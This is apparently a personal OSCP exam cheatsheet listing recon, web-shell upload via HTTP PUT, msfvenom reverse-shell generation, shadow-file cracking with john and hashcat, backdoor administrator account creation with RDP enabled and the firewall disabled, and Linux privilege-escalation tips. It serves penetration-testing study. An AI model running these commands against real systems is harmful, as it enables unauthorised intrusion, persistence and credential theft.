# oscp

# cheatsheet

## TODO:
- build list of dummy password to try

## workflow
1. zenmap intensive scan
2. zenmap full tcp scan
3. attemp to login web / ssh / ftp using common id passwords
    - id: `root`, `admin`
    - password: `root`, `toor`, `password`, `passw0rd`, `admin`, no password

## recon
### HTTP and HTTPs
1. dirbuster (gui)
1. dirb http://10.11.1.115:80/ -o 80_dirb.txt -p proxy:port
1. nikto -h http://10.11.1.115:80 -output 80_nikto.txt -useproxy http://proxy:port
1. if there is a `robots.txt`, check if there is anything that the scanners didn't find
1. also use `curl -i -X OPTIONS http://ip/path` to check what METHODs are available on specific resource
    - `curl -v -X PUT -d '<?php system($_GET["cmd"]);?>' http://192.168.142.131/test/shell.php`
    - `curl --upload-file  php-reverse-shell.txt -v --url http://192.168.142.131/test/shell.php -0 --http1.0`
1. cms scan (? todo: read it from a tool)
    - `wpscan` (wordpress)
    - `joomscan` (joombla)
    - `drupalscan`(?)
1. if there is a proxy server run on the target, try to set browser's proxy pointing to the proxy server
    - use `auxiliary/scanner/http/squid_pivot_scanning` metasploit module for squid/proxy scan, ref: [SickOS 1.1](https://highon.coffee/blog/sickos-1-walkthrough/).
1. it's possible that the server only allow certain user-agent to connect. Check it.
1. Find text and links
    - curl -i <url> -s | html2text
    ```python
    from BeautifulSoup import BeautifulSoup
    import urllib2
    import re

    html_page = urllib2.urlopen("http://www.yourwebsite.com")
    soup = BeautifulSoup(html_page)
    for link in soup.findAll('a'):
        print link.get('href')
    ```
1. for wireshark vulnerability, follow https://highon.coffee/blog/sickos-1-walkthrough/ to get reverse shell via Burp
1. if there is a MySQL database related to the app, find if any config.php or other php containing the database access id/password.
    ```php
    // Database settings:
    define('DB_DSN', 'mysql:dbname=wolf;host=localhost;port=3306');
    define('DB_USER', 'root');
    define('DB_PASS', 'john@123');
    define('TABLE_PREFIX', '');
    ```

## show NFS mount dir content
- `showmount -e ip_address`
- `mount -t nfs ip:/dir_to_mount local_mount_path -o nolock`


## password hash cracking
Cloud:
- https://crackstation.net/
- https://www.md5online.org/

Local tools:
- hash-identifier
- john
```bash
unshadow passwd.txt shadow.txt > unshadowed.txt
john --wordlist=/usr/share/wordlists/rockyou.txt --fork=4 unshadowed.txt
```
- hashcat
```bash
unshadow passwd.txt shadow.txt > unshadowed.txt
hashcat -m 0 -a 0 -o unshadowed_cracked.txt unshadowed.txt /usr/share/wordlists/rockyou.txt  # md5
hashcat -m 400 -a 0 -o unshadowed_cracked.txt unshadowed.txt /usr/share/wordlists/rockyou.txt  # WordPress (MD5)
hashcat -m 1800 -a 0 'hashvalue' /usr/share/wordlists/rockyou.txt  # $6$ Linux SHA-256, supply single hash value in CLI
hashcat -m 1800 -a 0 -D 2 -O 'hashvalue' /usr/share/wordlists/rockyou.txt # use GPU
```
To find hash type,
```bash
hashcat --help | grep -i wordpress
```

Hash type examples: https://hashcat.net/wiki/doku.php?id=example_hashes

Wordlist:
- `/usr/share/wordlists/rockyou.txt`
- `/usr/share/seclists/Passwords/phpbb.txt`
- `/usr/share/seclists/Passwords/10k_most_common.txt`
- https://github.com/danielmiessler/SecLists

For CTF / OSCP, should not take you more than 30 mins to crack


## generate reverse shell payload
- msfvnon https://sushant747.gitbooks.io/total-oscp-guide/reverse-shell.html
- https://highon.coffee/blog/reverse-shell-cheat-sheet/
- https://github.com/rapid7/metasploit-framework/wiki/How-to-use-a-reverse-shell-in-Metasploit
- http://security-geek.in/2016/09/07/msfvenom-cheat-sheet/  J2EE war reverse shell: 
    ```shell
    msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f war > reverse.war
    ```

## convert reverse shell to tty
```python
python -c "import pty; pty.spawn('/bin/bash')"
```

## windows binary examine
- `strings executable_filename` to see symbols inside the file.. you may find the hardcoded id/password
- if the web site contains some windows PE, might worth to try buffer overflow attacks

## buffer overflow attack
### Generate pattern
- https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/

## create user account
Linux:


Windows:
```
REM ****************
REM Enable Remote Desktop
REM ****************
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

REM ***************
REM Create a USER usr= librah, pass= passw0rd
REM ***************
net user /add librah passw0rd
net localgroup "Administrators" /add librah
net localgroup “Remote Desktop Users” /add librah

REM ***************
REM Show USER info
REM ***************
net user librah

netsh firewall set opmode disable  # todo - available on all windows?
```

Reference: 
- https://www.windows-commandline.com/cmd-net-user-command/
- https://www.windows-commandline.com/enable-remote-desktop-command-line/


## transfer files
Run http server
```shell
python -m SimpleHTTPServer 80
```

Run ftp server
```shell
python -m pyftpdlib
```

## Linux privilege escalation
- Linux https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
- Tools
    - https://github.com/rebootuser/LinEnum
    - www.securitysift.com/download/linuxprivchecker.py
    - http://pentestmonkey.net/tools/audit/unix-privesc-check
- Check if any suid executables that can be used.
    - ex: `cp`, `cat` will then be able to read everything
    - ex: `vi` will be able to get to `!bash`
- when searching exploits, search not only kernal but also distribution to increase coverage
  - `searchsploit kernel 3.x`
  - `searchsploit ubuntu 14.04`

## references
- https://sushant747.gitbooks.io/total-oscp-guide/
- https://www.securitysift.com/offsec-pwb-oscp/
- https://github.com/xapax/oscp
- Previlege escalation
  - Linux https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
  - Windows http://www.fuzzysecurity.com/tutorials/16.html
- OSCP experience sharing
  - https://scund00r.com/all/oscp/2018/02/25/passing-oscp.html
  - https://medium.com/@hakluke/haklukes-ultimate-oscp-guide-part-2-workflow-and-documentation-tips-9dd335204a48
  - https://medium.com/@hakluke/haklukes-ultimate-oscp-guide-part-3-practical-hacking-tips-and-tricks-c38486f5fc97
  - https://medium.com/@m4lv0id/and-i-did-oscp-589babbfea19
  - https://gist.github.com/unfo/5ddc85671dcf39f877aaf5dce105fac3
  - https://0daylego.wordpress.com/2017/04/29/scripting-my-way-through-the-oscp-labs/
- [OSCP Exam Guide](https://support.offensive-security.com/#!oscp-exam-guide.md)
